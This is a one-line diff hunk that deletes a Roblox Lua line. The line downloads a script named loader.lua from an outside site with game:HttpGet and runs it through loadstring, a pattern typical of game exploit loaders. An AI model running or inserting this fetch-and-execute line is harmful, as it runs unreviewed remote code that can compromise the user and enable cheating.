@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://logixism.tech/AlphaX/loader.lua", true))() 
